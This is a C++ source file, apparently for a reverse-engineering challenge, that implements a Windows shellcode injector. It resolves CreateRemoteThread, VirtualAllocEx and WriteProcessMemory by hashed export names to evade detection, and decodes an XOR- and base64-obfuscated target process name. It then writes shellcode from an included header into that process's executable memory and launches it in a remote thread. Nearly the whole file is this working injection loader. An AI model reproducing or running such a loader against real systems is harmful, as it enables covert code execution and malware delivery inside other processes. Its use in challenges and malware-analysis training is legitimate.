#include <vector>
#include <string>
#include <algorithm>
#include <windows.h>
#include <iostream>
#include <TlHelp32.h>
#include <psapi.h>
#include <fstream>
#include "shellcode.h"


struct kernel32 {
	using customCreateRemoteThread = HANDLE(NTAPI*)(
		HANDLE                 hProcess,
		LPSECURITY_ATTRIBUTES  lpThreadAttributes,
		SIZE_T                 dwStackSize,
		LPTHREAD_START_ROUTINE lpStartAddress,
		__drv_aliasesMem LPVOID lpParameter,
		DWORD                  dwCreationFlags,
		LPDWORD                lpThreadId
		);

	using customOpenProcess = HANDLE(NTAPI*)(
		DWORD dwDesiredAccess,
		BOOL  bInheritHandle,
		DWORD dwProcessId
		);

	using customVirtualAllocEx = LPVOID(NTAPI*)(
		HANDLE hProcess,
		LPVOID lpAddress,
		SIZE_T dwSize,
		DWORD  flAllocationType,
		DWORD  flProtect
		);

	using customWriteProcessMemory = BOOL(NTAPI*)(
		HANDLE  hProcess,
		LPVOID  lpBaseAddress,
		LPCVOID lpBuffer,
		SIZE_T  nSize,
		SIZE_T* lpNumberOfBytesWritten
		);

	using customVirtualFreeEx = BOOL(NTAPI*)(
		HANDLE hProcess,
		LPVOID lpAddress,
		SIZE_T dwSize,
		DWORD  dwFreeType
		);

	customCreateRemoteThread CreateRemoteThread;
	customOpenProcess OpenProcess;
	customVirtualAllocEx VirtualAllocEx;
	customWriteProcessMemory WriteProcessMemory;
	customVirtualFreeEx VirtualFreeEx;
};

DWORD getHashFromString(char* string) {
	DWORD hash = 0;
	for (int i = 0; i < strlen(string); i++)
	{
		hash += string[i];
		hash += (hash << 10);
		hash ^= (hash >> 6);
	}
	hash += (hash << 3);
	hash ^= (hash >> 11);
	hash += (hash << 15);
	return hash;
}

PDWORD getFunctionAddressByHash(const char* library, DWORD hash) {
	PDWORD functionAddress = (PDWORD)0;

	HMODULE libraryBase = LoadLibraryA(library);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)libraryBase;
	PIMAGE_NT_HEADERS imageNTHeaders = (PIMAGE_NT_HEADERS)((DWORD_PTR)libraryBase + dosHeader->e_lfanew);

	DWORD_PTR exportDirectoryRVA = imageNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;

	PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD_PTR)libraryBase + exportDirectoryRVA);

	PDWORD addresOfFunctionsRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfFunctions);
	PDWORD addressOfNamesRVA = (PDWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNames);
	PWORD addressOfNameOrdinalsRVA = (PWORD)((DWORD_PTR)libraryBase + imageExportDirectory->AddressOfNameOrdinals);

	for (DWORD i = 0; i < imageExportDirectory->NumberOfFunctions; i++) {
		DWORD functionNameRVA = addressOfNamesRVA[i];
		DWORD_PTR functionNameVA = (DWORD_PTR)libraryBase + functionNameRVA;
		char* functionName = (char*)functionNameVA;
		DWORD_PTR functionAddressRVA = 0;
		if (getHashFromString(functionName) == hash) {
			functionAddressRVA = addresOfFunctionsRVA[addressOfNameOrdinalsRVA[i]];
			functionAddress = (PDWORD)((DWORD_PTR)libraryBase + functionAddressRVA);
			return functionAddress;
		}
	}
}

static inline bool is_base64(BYTE c) {
	return (isalnum(c) || (c == '+') || (c == '/'));
}

std::string xorEncrypt(const std::string& enc_pname, const std::string& key) {
	std::string encrypted;
	for (size_t i = 0; i < enc_pname.length(); i++) {
		char encryptedChar = enc_pname[i] ^ key[i % key.length()];
		encrypted += encryptedChar;
	}
	return encrypted;
}

std::vector<BYTE> b64d(std::string const& encoded_string) {

	static const std::string base64_chars =
		"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
		"abcdefghijklmnopqrstuvwxyz"
		"0123456789+/";
	int in_len = encoded_string.size();
	int i = 0;
	int j = 0;
	int in_ = 0;
	BYTE char_array_4[4], char_array_3[3];
	std::vector<BYTE> ret;

	while (in_len-- && (encoded_string[in_] != '=') && is_base64(encoded_string[in_])) {
		char_array_4[i++] = encoded_string[in_]; in_++;
		if (i == 4) {
			for (i = 0; i < 4; i++)
				char_array_4[i] = base64_chars.find(char_array_4[i]);

			char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
			char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
			char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

			for (i = 0; (i < 3); i++)
				ret.push_back(char_array_3[i]);
			i = 0;
		}
	}

	if (i) {
		for (j = i; j < 4; j++)
			char_array_4[j] = 0;

		for (j = 0; j < 4; j++)
			char_array_4[j] = base64_chars.find(char_array_4[j]);

		char_array_3[0] = (char_array_4[0] << 2) + ((char_array_4[1] & 0x30) >> 4);
		char_array_3[1] = ((char_array_4[1] & 0xf) << 4) + ((char_array_4[2] & 0x3c) >> 2);
		char_array_3[2] = ((char_array_4[2] & 0x3) << 6) + char_array_4[3];

		for (j = 0; (j < i - 1); j++) ret.push_back(char_array_3[j]);
	}

	return ret;
}

int main()
{
	kernel32 k32;
	k32.CreateRemoteThread = (kernel32::customCreateRemoteThread)getFunctionAddressByHash("kernel32", 0xa68dbf19);
	k32.OpenProcess = (kernel32::customOpenProcess)getFunctionAddressByHash("kernel32", 0xa650376b);
	k32.VirtualAllocEx = (kernel32::customVirtualAllocEx)getFunctionAddressByHash("kernel32", 0xecfc793);
	k32.VirtualFreeEx = (kernel32::customVirtualFreeEx)getFunctionAddressByHash("kernel32", 0xab71b86b);
	k32.WriteProcessMemory = (kernel32::customWriteProcessMemory)getFunctionAddressByHash("kernel32", 0x184ec554);


	std::vector<DWORD> processIds(1024);
	DWORD cbNeeded, cProcesses, PID{};

	std::string key = "0cc175b9";
	std::string enc_pname = "XgwXVEdUBhIbTQZJUg==";

	std::cout << "[*] Searching for process to inject into... " << std::endl;
	std::vector<BYTE> b64_decoded = b64d(enc_pname);
	std::string b64_decoded_str(b64_decoded.begin(), b64_decoded.end());
	std::string processName = xorEncrypt(b64_decoded_str, key);
	if (!EnumProcesses(processIds.data(), static_cast<DWORD>(processIds.size() * sizeof(DWORD)), &cbNeeded))
	{
		return 0;
	}
	cProcesses = cbNeeded / sizeof(DWORD);
	for (DWORD i = 0; i < cProcesses; i++) {
		if (processIds[i] == 0) {
			continue;
		}

		HANDLE hProcess = k32.OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processIds[i]);
		if (hProcess == nullptr) {
			continue;
		}

		HMODULE hMod;
		DWORD cbNeeded;

		if (!EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
			CloseHandle(hProcess);
			continue;
		}

		std::vector<char> szProcessName(MAX_PATH, '\0');

		if (GetModuleBaseNameA(hProcess, hMod, szProcessName.data(), static_cast<DWORD>(szProcessName.size()))) {
			szProcessName.resize(strlen(szProcessName.data()));
			if (processName == szProcessName.data()) {
				std::cout << "[*] Found process: " << szProcessName.data() << std::endl;
				PID = processIds[i];
				break;
			}
		}

		CloseHandle(hProcess);
	}
	DWORD pid = PID;
	if (PID == 0) {
		std::cout << "[*] Process not found, exiting..." << std::endl;
		std::cout << "[*] Press any key to exit..." << std::endl;
		std::cin.get();
		return 0;
	}

	HANDLE hProcess = k32.OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL) {
		std::cout << "Uh oh, something went wrong with the challenge. Error: L224" << std::endl;
		return 0;
	}

	SIZE_T shellcodeSize = sizeof(*shellcode);

	LPVOID shellcodeAddress = k32.VirtualAllocEx(hProcess, NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (shellcodeAddress == NULL) {
		std::cout << "Uh oh, something went wrong with the challenge. Error: L232" << std::endl;
		std::cout << "Feel free to continue trying, this error should not be a problem." << std::endl;
		CloseHandle(hProcess);
		return 0;

	}
	
	if (!WriteProcessMemory(hProcess, shellcodeAddress, shellcode, shellcodeSize, NULL)) {
		std::cout << "Uh oh, something went wrong with the challenge. Error: L239" << std::endl;
		std::cout << "Feel free to continue trying, this error should not be a problem." << std::endl;
		VirtualFreeEx(hProcess, shellcodeAddress, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return 0;
	}

	HANDLE hThread = k32.CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)shellcodeAddress, NULL, 0, NULL);
	if (hThread == NULL) {
		std::cout << "Uh oh, something went wrong with the challenge. Error: L247" << std::endl;
		std::cout << "Feel free to continue trying, this error should not be a problem." << std::endl;
		VirtualFreeEx(hProcess, shellcodeAddress, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return 0;
	}

	std::cout << "[*] Shellcode injected..." << std::endl;

	std::cout << "[*] Waiting for thread to die..." << std::endl;

	WaitForSingleObject(hThread, INFINITE);
	CloseHandle(hThread);
	VirtualFreeEx(hProcess, shellcodeAddress, 0, MEM_RELEASE);
	CloseHandle(hProcess);

	std::cout << "[*] Press enter to exit...";
	std::cin.get();


	return 0;
}